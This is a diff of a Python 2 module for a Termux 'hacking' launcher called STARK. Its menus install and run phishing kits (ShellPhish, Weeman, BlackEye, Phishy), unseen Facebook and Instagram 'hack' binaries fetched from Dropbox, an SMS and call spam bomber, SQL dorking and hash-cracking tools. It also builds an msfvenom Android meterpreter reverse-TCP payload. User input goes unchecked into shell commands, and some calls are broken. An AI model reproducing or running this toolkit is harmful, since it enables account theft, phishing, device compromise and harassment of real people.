@@ -1,259 +1,360 @@
-##starkmcore.py - useful module for STARK2.0
 import os
 import sys
 import time
 from termcolor import colored
 
-backtomenubanner = """
-BACK TO MENU ?
-[1] YES
-[2]  NO"""
+##FUNCTIONS
+PATH='./modules/test.txt'
 
-def achacking():
- print(colored("""
-     ==================================================
-     ....###.........######.....##.....##....###.....######..##....##
-     ...##.##.......##....##....##.....##...##.##...##....##.##...##.
-     ..##...##......##..........##.....##..##...##..##.......##..##..
-     .##.....##.....##..........#########.##.....##.##.......#####...
-     .#########.....##..........##.....##.#########.##.......##..##..
-     .##.....##.###.##....##....##.....##.##.....##.##....##.##...##.
-     .##.....##.###..######.....##.....##.##.....##..######..##....##
-     ==================================================
-	1. Facebook Hack
-	2. Instagram Hack
-	3. Phishy
-	4. Weeman
-	5. MBF
-	6. Shellphish
-     ==================================================
-	7. Back
-     ==================================================
-    """, 'green'))
-
- acha = raw_input("stark > ")
-
- if acha == "1":
-    	Facebookhack()
- elif acha == "2":
-    	Instagramhack()
- elif acha == "3":
-    	Phishy()
- elif acha == "4":
-    	Weeman()
- elif acha == "5":
- 	   Mbf()
- elif acha == "6":
- 	   shellphish()
- elif acha == "7":
- 	   os.system("clear")
- 	   restartprogram()
- elif acha == "0":
-        restartprogram()
+def checkfile():
+ if os.path.isfile(PATH) and os.access(PATH, os.R_OK):
+    print "Every thing is allright"
  else:
-	print_slow(colored("ERROR: WRONG COMMAND BRO.?", 'red'))
-	restartprogram()
+    print "some files is not installed"
+    time.sleep(2)
+    exit()
 
-def info():
- print(colored("""
-      _ _  _ ____ ____     ____ ____ ___ _  _ ____ ____ _ _  _ ____ 
-      | |\ | |___ |  |     | __ |__|  |  |__| |___ |__/ | |\ | | __ 
-      | | \| |    |__| .   |__] |  |  |  |  | |___ |  \ | | \| |__] 
+def netcheck():
+ print(colored("""CHECKING INTERNET ON/OFF""", "green"))
+ try :
+    stri = "https://www.google.co.in"
+    data = urllib.urlopen(stri)
+    print "Connected"
+ except:
+    print(colored("""THIS TOOL REQUIRE INTERNET""", "red"))
+    exit()
 
-      ==============================================
-      1. Red_Hawk
-      2. ReconDog
-      3. SQL Scanner
-      4. Txtool
-      5. D-Tect
-      6. CloudFail       ==>(This is scan or bypass the cloudflare)
-      7. InurlBR
-      ==============================================
-      8. Back
-      ==============================================
-""", 'green'))
+def reset():
+        python = sys.executable
+        os.execl(python, python, * sys.argv)
+        curdir = os.getcwd()
 
- info = raw_input("stark > ")
- 
- if info == "1":
- 	Redhawk()
- elif info == "2":
- 	ReconDog()
- elif info == "3":
- 	Sqlscanner()
- elif info == "4":
- 	Txtool()
- elif info == "5":
- 	dtect()
- elif info == "6":
- 	os.system("git clone https://github.com/m0rtem/CloudFail")
-	os.system("mv CloudFail ~")
- elif info == "7":
-	os.system("git clone https://github.com/googleinurl/SCANNER-INURLBR")
-	os.system("mv SCANNER-INURLBR ~") 
- elif info == "8":
- 	 os.system("clear")
- 	 restartprogram()
- elif info == "0":
-       restartprogram()
- else:
-       print_slow(colored("ERROR: WRONG COMMAND BRO.?", 'red'))
-       os.system("clear")
-       restartprogram()
-	
-def webhacking():
- print(colored("""
-                        _          _                   _     _               
-       __      __  ___ | |__      | |__    __ _   ___ | | __(_) _ __    __ _ 
-       \ \ /\ / / / _ \| '_ \     | '_ \  / _` | / __|| |/ /| || '_ \  / _` |
-        \ V  V / |  __/| |_) | _  | | | || (_| || (__ |   < | || | | || (_| |
-         \_/\_/   \___||_.__/ (_) |_| |_| \__,_| \___||_|\_\|_||_| |_| \__, |
-                                                                       |___/
- """, 'red'))
- print(colored("""
-       =====================================================================
-       1. SQLInjection
-       =====================================================================
-       2.Back
-       =====================================================================
- """, 'green'))
- 
- webh = raw_input("stark > ")
- 
- if webh == "1":
- 	Sqli()
- elif webh == "2":
- 	os.system("clear")
-        restartprogram()
-     
- elif info == "0":
-     restartprogram()
- else:
-	print_slow(colored("ERROR: WRONG COMMAND BRO.?", 'red'))
-	os.system("clear")
-	restartprogram()
-	
-def termux():
- print(colored("""
-       _____                                     
-      |_   _|                                    
-        | |    ___  _ __  _ __ ___   _   _ __  __
-        | |   / _ \| '__|| '_ ` _ \ | | | |\ \/ /
-        | |  |  __/| |   | | | | | || |_| | >  < 
-        \_/   \___||_|   |_| |_| |_| \__,_|/_/\_\
-                                            
-      ============================================
-      1. Lazymux
-      2. Metasploit-Framework
-      3. Beef Framework =>  ( to many error with unstable metasploit )
-      4. ohmyzsh ============> (new look for termux)
-      5. Tload ===============> (Best for Payloadmaker)
-      6. LazyMeta ============>(payload maker tool)
-      7. print architecture ======>(32 bit or 64 bit)
-      8. Facebook
-      9. TBomb 		===========(SMS AND CALL SPAM)
-      10. TAssistant 	=========> (new tool)
-      ============================================
-      11. Back
-      ============================================                                      
-   """, 'green'))
+def printslow(str):
+    for letter in str:
+        sys.stdout.write(letter)
+        sys.stdout.flush()
+        time.sleep(0.1)
 
- termux = raw_input("stark > ")
- 
- if termux == "1":
- 	Lazymux()
- elif termux == "2":
- 	Metasploit()
- elif termux == "3":
- 	os.system("""mkdir -p $PREFIX/etc/apt/sources.list.d && printf "deb [trusted=yes] https://hax4us.github.io/termux-tools/ extras main" > $PREFIX/etc/apt/sources.list.d/hax4us.list""")
- 	os.system("apt update")
- 	print_slow(colored("Now open new tab use this command\napt install update then pkg install beef-xss", 'green'))
- elif termux == "4":
- 	Ohmyzsh()
- elif termux == "5":
- 	tload()
- elif termux == "6":
- 	lazymeta()
- elif termux == "7":
-     os.system("dpkg --print-architecture")
-     time.sleep(3)
-     backtomenu()
- elif termux == "8":
- 	Facebook()
-        backtomenu()
- elif termux == "9":
- 	os.system("git clone https://github.com/TheSpeedX/TBomb")
-        os.system("mv TBomb ~")
-	print_slow(colored("""Installed""", "green"))
-	print_slow(colored("""You Need to Watch the Video""", "green"))
-	os.system("termux-open-url https://www.youtube.com/channel/UC6CwdVj9ztWzJtO3q43isfg")
- elif termux == "10":
-	os.system("git clone https://github.com/aniketstark/TAssistent")
-	os.system("mv TAssistent ~")
-	backtomenu()
- elif termux == "11":
-     os.system("clear")
-     restartprogram()
-     
- elif info == "0":
-     restartprogram()
- else:
-	print_slow(colored("ERROR: WRONG COMMAND BRO.?", 'red'))
-	os.system("clear")
-	restartprogram()
-def Fix():
- print(colored("""
- 
-       .########.########..########...#######..########.
-       .##.......##.....##.##.....##.##.....##.##.....##
-       .##.......##.....##.##.....##.##.....##.##.....##
-       .######...########..########..##.....##.########.
-       .##.......##...##...##...##...##.....##.##...##..
-       .##.......##....##..##....##..##.....##.##....##.
-       .########.##.....##.##.....##..#######..##.....##
+###################Basic Command
 
-       .##..........#####...##.......
-       .##....##...##...##..##....##.
-       .##....##..##.....##.##....##.
-       .##....##..##.....##.##....##.
-       .#########.##.....##.#########
-       .......##...##...##........##.
-       .......##....#####.........##.
-       
-   """, 'red'))
+def BasicC():
  print(colored("""
-    ==============================================  
-    1. Metasploit database fixer
-    2. Metasploit nokogiri fixer
-    3. beef nokogiri fixer
-    4. Setup storage in Termux
-    5. Restore official source list
-    6. Beef bundle not install Fix (thread,nokogiri,gem file fix)
-    ==============================================
-    7. Exit
-    ==============================================
-    """, 'green'))
+	=================================================
+	 .########.....###.....######..####..######.
+	 .##.....##...##.##...##....##..##..##....##
+	 .##.....##..##...##..##........##..##......
+	 .########..##.....##..######...##..##......
+	 .##.....##.#########.......##..##..##......
+	 .##.....##.##.....##.##....##..##..##....##
+	 .########..##.....##..######..####..######.
+	=================================================
+	1. Flash Light
+	2. Battery Status
+	3. Capture Photo
+	4. Text to Speech (offline)
+	5. Print Architecture
+	6. Payload Maker
+	7. PortForwarding (using serveo.net)
+	=================================================
+	8. Back
+	=================================================
+ """, "green"))
+
+ basic = raw_input("stark > ")
+
+ if basic == "1":
+	flash()
+ elif basic == "2":
+	battery()
+ elif basic == "3":
+	cphoto()
+ elif basic == "4":
+	textspeach()
+ elif basic == "5":
+	os.system("dpkg --print-architecture")
+        time.sleep(3)
+ elif basic == "6":
+	payload()
+ elif basic == "7":
+	portforward()
+ elif basic == "8":
+	reset()
+
+def portforward():
+ print(colored("""
+  #######################
+  1. HTTP
+  2. TCP
+  ######################
+  """, "green"))
+ port = raw_input("portf > ")
+ if port == "1":
+  p1 = raw_input("HTTPS > ")
+  os.system("ssh -R 80:localhost:"+ p1 +" serveo.net")
+ if port == "2":
+  p2 = raw_input("TCP > ")
+  os.system("ssh -R "+ p2 +":localhost:"+ p2 +" serveo.net")
+
+def payload():
+ print(colored("""
+  #######################
+  1. Android
+  #######################
+  """, "green"))
+ pay = raw_input("pay > ")
+ if pay == "1":
+  print(colored("""Enter LocalHost And LPort""", "green"))
+  l1 = raw_input("host > ")
+  l2 = raw_input("port > ")
+  os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ l1 +" LPORT="+ l2 +" R > /sdcard/payload.apk")
+  print(colored("""payload save in sdcard payload.apk""", "green"))
+
+def flash():
+ print(colored("""
+	===============
+	1. On
+	2. Off
+	===============
+ ""","green"))
+ torch = raw_input("stark >")
+ if torch == "1":
+  os.system("termux-torch on")
+ elif torch == "2":
+  os.system("termux-torch off")
+
+def battery():
+ os.system("termux-battery-status")
+ time.sleep(3)
+
+
+def cphoto():
+ print(colored("""
+  #####################
+  1.Back
+  2.Front
+  ####################
+  """, "green"))
+ cp = raw_input("photo > ")
+ if cp == "1":
+  os.system("termux-camera-photo -c 0 /sdcard/back")
+  print(colored("""image has been saved in /sdcard/back.jpg""", "green"))
+ elif cp == "2":
+  os.system("termux-camera-photo -c 1 /sdcard/front")
+  print(colored("""image has been saved in /sdcard/front.jpg""", "green"))
+
+def textspeach():
+ print(colored("""Enter here your words sir""", "green"))
+ txtsp = raw_input("text > ")
+ os.system("termux-tts-speak "+ txtsp +".")
+
+###################About Section
+def follow():
+ print(colored("""
+  #######################
+  1. Visit Blogger
+  2. Visit Instagram
+  3. Visit YouTube Channel
+  ########################
+  """, "green"))
+ visit = raw_input("go > ")
+ if visit == "1":
+  os.system("termux-open-url https://gamerstech330.blogspot.com/")
+ elif visit == "2":
+  os.system("termux-open-url https://instagram.com/aniketstark330")
+ elif visit == "3":
+  os.system("termux-open-url https://www.youtube.com/channel/UCjb4zsUpNuSSaCCUirQL_sQ")
+
+###################Credit Section
+def Credits():
+ printslow(colored("""
+  ####################################
+  TOOLS                 DEVELOPERS
+  ####################################
+  ShellPhish            TheLinuxChoice
+  BlackEye              TheLinuxChoice
+  Weeman                Evait Security GmbH
+  Red_Hawk              Tuhinshubhra
+  Hasher                CiKu370
+  SCANNER-INURLBR       GoogleINURL
+  TorsHammer            TheLinuxChoice
+  Hulk                  Grafov
+  GoldenEye             Jseidl
+  Breacher(admin_f)     s0md3v
+  ####################################
+  """, "green"))
+
+###################Account Hacking Section
+
+def AccountH():
+ print colored("""
+  ===============================================================
+    ....###.....######......##.....##....###.....######..##....##
+    ...##.##...##....##.....##.....##...##.##...##....##.##...##.
+    ..##...##..##...........##.....##..##...##..##.......##..##..
+    .##.....##.##...........#########.##.....##.##.......#####...
+    .#########.##...........##.....##.#########.##.......##..##..
+    .##.....##.##....##.###.##.....##.##.....##.##....##.##...##.
+    .##.....##..######..###.##.....##.##.....##..######..##....##
+  ===============================================================""", "red"), colored("""
+   1. ShellPhish
+   2. Weeman
+   3. BlackEye""","green"), colored("""
+  ===============================================================
+  """, "red")
+ phish = raw_input("phishing > ")
+ if phish == "1":
+  os.system("cd modules/shellphish && bash shellphish.sh")
+ elif phish  == "2":
+  os.system("cd modules/weeman && python2 weeman.py")
+ elif phish  == "3":
+  os.system("cd modules/blackeye/ && bash blackeye.sh")
+ elif phish  == "4":
+  reset()
+
+###################Web Hacking Section
+
+def WebH():
+ print colored("""
+    ____  ____  ____  ____  ____  ____  ____ 
+   ||W ||||e ||||b ||||H ||||a ||||c ||||k ||
+   ||__||||__||||__||||__||||__||||__||||__||
+   |/__\||/__\||/__\||/__\||/__\||/__\||/__\|
+   ==========================================""", "white"), colored("""
+   1. Red_Hawk
+   2. SQLDork
+   3. WebAdminFinder
+   4. SQLMap""","green"), colored("""
+   ==========================================
+   """, "white")
+ web = raw_input("webh > ")
+ if web == "1":
+  os.system("cd modules/RED_HAWK && php rhawk.php")
+ elif web == "2":
+  sqldork()
+ elif web == "3":
+  webadm()
+ elif web == "4":
+  sqlmap()
+
+def sqlmap():
+  printslow(colored("""CLONING SQLMAP IN HOME""","green"))
+  os.system("git clone https://github.com/sqlmapproject/sqlmap")
+  os.system("mv sqlmap ~")
+  printslow(colored("""Warning""","red"))
+  printslow(colored("""YOU NEED TO USE SQLMAP AS MANUALY""","green"))
+
+def webadm():
+  print(colored("""Enter Website Url""", "green"))
+  web1 = raw_input("url > ")
+  os.system("cd modules/Breacher && python2 breacher.py -u "+ web1 +" --fast")
+
+def sqldork():
+  os.system("cd modules/SCANNER-INURLBR/ && bash sql.sh")
+
+###################Hash Crack Section
+def HASH():
+ print colored("""
+   __    __       ___           _______. __    __  
+  |  |  |  |     /   \         /       ||  |  |  | 
+  |  |__|  |    /  ^  \       |   (----`|  |__|  | 
+  |   __   |   /  /_\  \       \   \    |   __   | 
+  |  |  |  |  /  _____  \  .----)   |   |  |  |  | 
+  |__|  |__| /__/     \__\ |_______/    |__|  |__| 
+                                                   
+ ========================================================== ""","blue"), colored("""
+ 1. Hash-Buster
+ 2. Hasher""","green"), colored("""
+ ==========================================================""","blue")
+ hasher = raw_input("hash > ")
+ if hasher == "1":
+  os.system("cd modules/Hash-Buster && python hash.py")
+ elif hasher == "2":
+  os.system("cd modules/hasher && python2 hash.py")
+
+###################Termux Section
+def Termux():
+ print colored("""
+   ______  ____ ____  ___  ___ __ __ _   _
+  | || | ||    || \\ ||\\//|| || || \\ //
+    ||   ||==  ||_// || \/ || || ||  )X( 
+    ||   ||___ || \\ ||    || \\_// // \\
+                                         
+  ==========================================""","cyan"), colored("""
+  1. Lazymux
+  2. Beef Framework  ( to many error with unstable metasploit )
+  3. ohmyzsh	     (new look for termux)
+  4. TBomb           (SMS AND CALL SPAM)
+  5. LazyMeta	     (Payload Maker Tool)""","green"), colored("""
+  ==========================================""","cyan"), colored("""
+  6. Back""","green"), colored("""
+  ==========================================""","cyan")
+ term = raw_input("term > ")
+ if term == "1":
+  os.system("git clone https://github.com/Gameye98/Lazymux")
+  os.system("mv Lazymux ~")
+ elif term == "2": 
+  os.system("""mkdir -p $PREFIX/etc/apt/sources.list.d && printf "deb [trusted=yes] https://hax4us.github.io/termux-tools/ extras main" > $PREFIX/etc/apt/sources.list.d/hax4us.list""")
+  os.system("apt update")
+  printslow(colored("Now open new tab use this command\napt install update then pkg install beef-xss", 'green'))
+ elif term == "3":
+  os.system("git clone https://github.com/aniketstark/ohmyzsh")
+  os.system("mv ohmyzsh ~")
+ elif term == "4":
+  os.system("git clone https://github.com/TheSpeedX/TBomb")
+  os.system("mv TBomb ~")
+ elif term == "5":
+  os.system("git clone https://github.com/aniketstark/LazyMeta")
+  os.system("mv LazyMeta ~")
+
+###################Error Fixer
+
+def EFixer():
+ os.system("clear")
+ print colored("""
+  .########.########..########...#######..########.
+  .##.......##.....##.##.....##.##.....##.##.....##
+  .##.......##.....##.##.....##.##.....##.##.....##
+  .######...########..########..##.....##.########.
+  .##.......##...##...##...##...##.....##.##...##..
+  .##.......##....##..##....##..##.....##.##....##.
+  .########.##.....##.##.....##..#######..##.....##
+
+  .##..........#####...##.......
+  .##....##...##...##..##....##.
+  .##....##..##.....##.##....##.
+  .##....##..##.....##.##....##.
+  .#########.##.....##.#########
+  .......##...##...##........##.
+  .......##....#####.........##.
+  ==================================================""","red"), colored("""
+  1. Metasploit database fixer
+  2. Metasploit nokogiri fixer
+  3. beef nokogiri fixer
+  4. Setup storage in Termux
+  5. Restore official source list
+  6. Beef bundle not install Fix (thread,nokogiri,gem file fix)""","green"), colored("""
+  ==================================================""","red")
  Fix = raw_input("stark > ")
  if Fix == "1":
      os.system("mkdir -p $PREFIX/var/lib/postgresql")
      os.system("initdb $PREFIX/var/lib/postgresql")
      os.system("pg_ctl -D $PREFIX/var/lib/postgresql start")
      print(colored("""FIXED.!""", "green"))
-     print_slow(colored("""if you get this error again by again\n so fix from here ok. :)""","red"))
- 
+     printslow(colored("""if you get this error again by again\n so fix from here ok. :)""","red"))
+
  elif Fix == "2":
      os.system("bundle config build.nokogiri --use-system-libraries")
      os.system("bundle install")
- 
+
  elif Fix == "4":
- 	print_slow(colored("""Fixing storage\n""", "green"))
- 	os.system("termux-setup-storage")
-        print_slow(colored("""Fixed..!""", "green"))
- 
+        print_slow(colored("""Fixing storage\n""", "green"))
+        os.system("termux-setup-storage")
+        printslow(colored("""Fixed..!""", "green"))
+
  elif Fix == "3":
      os.system("cd $PREFIX/share/beef-xss && gem install nokogiri")
-     print_slow(colored("FIXED !", 'green'))
-     
+     printslow(colored("FIXED !", 'green'))
+
  elif Fix == "5":
      os.system("wget https://www.dropbox.com/s/tntdeo1q9bpwc6c/sources.list")
      os.system("rm -rf /data/data/com.termux/files/usr/etc/apt/sources.list")
@@ -261,186 +362,8 @@ def Fix():
      os.system("mv sources.list /data/data/com.termux/files/usr/etc/apt/")
 
  elif Fix == "6":
- 	os.system("cd $PREFIX/share/beef-xss && bundle install")
-	backtomenu()
+        os.system("cd $PREFIX/share/beef-xss && bundle install")
 
  elif Fix == "7":
      os.system("clear")
-     restartprogram()
-     
- elif info == "0":
-     restartprogram()
- else:
-	print_slow(colored("ERROR: WRONG COMMAND BRO.?", 'red'))
-	os.system("clear")
-	restartprogram()
-
-def shellphish():
- print_slow(colored("installing shellphish", 'red'))
- os.system("git clone https://github.com/thelinuxchoice/shellphish")
- os.system("mv shellphish ~")
- backtomenu()
- 
-def Ohmyzsh():
- print_slow(colored("New look for termux with\ncool features", 'cyan'))
- os.system(" https://github.com/aniketstark/ohmyzsh")
- os.system("mv ohmyzsh")
- backtomenu()
-
-def Txtool():
- print_slow(colored("installing txtool", 'red'))
- os.system("git clone https://github.com/kuburan/txtool")
- os.system("mv txtool ~")
- backtomenu()
-
-def ReconDog():
- print_slow(colored("installing ReconDog", 'green'))
- os.system("git clone https://github.com/UltimateHackers/ReconDog")
- os.system("mv ReconDog ~")
- backtomenu()
- 
-def Facebookhack():
-	print '###### installing facebook hack'
-	os.system('apt install python2')
-	os.system('cd && mkdir facebookhack')
-	os.system('wget https://www.dropbox.com/s/4d72hyfwrii5vw7/facebook.py ')
-	os.system('mv facebook.py $HOME/facebookhack')
-	backtomenu()
-	
-def Instagramhack():
-	print '###### installing instagram hack'
-	os.system('apt install python2')
-	os.system('wget wget https://www.dropbox.com/s/1sjot5w4af4t17o/instahack')
-	os.system('chmod +x instahack')
-	os.system('./instahack')
-	os.system('rm -r instahack')
-	print 'NOW GO TO INSABRUTE AND HACK IT'
-	backtomenu()
-	
-def Lazymux():
-	print '###### installing lazymux'
-	os.system('git clone https://github.com/Gameye98/Lazymux')
-	os.system('mv Lazymux ~')
-	print 'Lazymux is installed'
-	backtomenu()
-	
-def Sqli():
-    print '###### installing SQLI'
-    os.system('git clone https://github.com/sqlmapproject/sqlmap')
-    os.system('mv sqlmap ~')
-    print 'NOW HACK SQL WEBSITE??????'
-    backtomenu()
-    
-def Weeman():
-    print '###### installung weeman'
-    os.system('git clone https://github.com/evait-security/weeman')
-    os.system('mv weeman ~')
-    print 'phishing with weeman oh yaaaaaa??????'
-    backtomenu()
-
-def Mbf():
-    print_slow(colored("installing MBF", 'green'))
-    os.system("wget https://www.dropbox.com/s/6p3xdm8en3b2cn9/MBF.zip")
-    os.system("unzip MBF.zip")
-    os.system("rm -rf MBF.zip")
-    os.system("mv MBF ~")
-    backtomenu()
-    
-def Sqlscanner():
-    print '###### install Sql website scanner'
-    os.system('git clone https://github.com/Cvar1984/sqlscan.git/')
-    print 'NOW SCAN SQL ERROR IN WEBSITE'
-    backtomenu()
-	
-def Redhawk():
-	print '###### installing RED_HAWK'
-	os.system('git clone https://github.com/Tuhinshubhra/RED_HAWK')
-	os.system('mv RED_HAWK ~')
-	print'REDHAWK IS INSTALLED GET ALL INFO. FROM WEBSITE'
-	backtomenu()
-
-def Ohmyzsh():
-	print (colored("INSTALLING OH MY ZSH", 'green'))
-	os.system('git clone https://github.com/aniketstark/ohmyzsh')
-	os.system('mv ohmyzsh ~')
-	backtomenu()
-	
-def Instabot():
-	print (colored("INSTALLING InstaBot", 'magenta'))
-	os.system('git clone https://github.com/instabot-py/instabot.py')
-	os.system('mv instabot.py ~')
-	backtomenu()
-	
-def Phishy():
-	print (colored("INSTALLING PHISHY", 'green'))
-	print_slow(colored("HAPPY PHISHING BITCH", 'red'))
-	os.system('git clone https://github.com/aniketstark/Phishy')
-	os.system('mv Phishy ~')
-	backtomenu()
-	
-def Metasploit():
-	os.system("wget https://Auxilus.github.io/metasploit.sh")
-	os.system("chmod +x metasploit.sh")
-	os.system("mv metasploit.sh ~")
-	print_slow(colored("now run sh metasploit.sh", 'green'))
-	backtomenu()
-		
-def tload():
-	os.system("wget https://www.dropbox.com/s/ql8ydqoiyk6h779/T-Load.zip")
-	os.system("unzip T-Load.zip")
-	os.system("rm -rf T-Load.zip")
-	os.system("mv T-Load ~")
-	backtomenu()
-	
-def lazymeta():
-	os.system("git clone https://github.com/aniketstark/LazyMeta")
-	os.system("mv LazyMeta ~")
-	backtomenu()
-	
-def Update():
-	print_slow(colored("always update this tool ok.!", 'cyan'))
-	print_slow(colored("updating.........\n", 'green'))
-	os.system('git pull')
-	restartprogram()
-
-def Facebook():
-	os.system("git clone https://github.com/xHak9x/fbi")
-	os.system("mv fbi ~")
-
-def dtect():
-	os.system("git clone https://github.com/shawarkhanethicalhacker/D-TECT-1")
-	os.system("mv D-TECT-1 ~")
-
-def print_slow(str):
-    for letter in str:
-        sys.stdout.write(letter)
-        sys.stdout.flush()
-        time.sleep(0.1)
-
-def restartprogram():
-	python = sys.executable
-	os.execl(python, python, * sys.argv)
-	curdir = os.getcwd()
-	
-def backtomenu():
-	print backtomenubanner
-	backtomenu = raw_input("stark > ")
-	if backtomenu == "1":
-		restartprogram()
-	elif backtomenu == "2":
-		sys.exit()
-	else:
-		print (colored("ERROR: WRONG COMMAND BRO.?", 'red'))
-		time.sleep(2)
-		restartprogram()
-	
-def About():
-	print_slow(colored("hi this is aniket stark welcome to my tool\nhahaha sorry thats a python2 script edit and create by me\nthanks to undeadsec,anonhacker,Stackoverflow.com\nfor more tools please support me and subscribe me\ni have youtube channel GamersTech330 .!", 'red'))
-	backtomenu()
-
-def gpst():
-    os.system("wget https://www.dropbox.com/s/x3zmgz1fjd8b4od/gps.zip")
-    time.sleep(2)
-    os.system("unzip gps.zip")
-    os.system("mv gps ~")
-    os.system("rm -rf gps.zip")
+     reset()
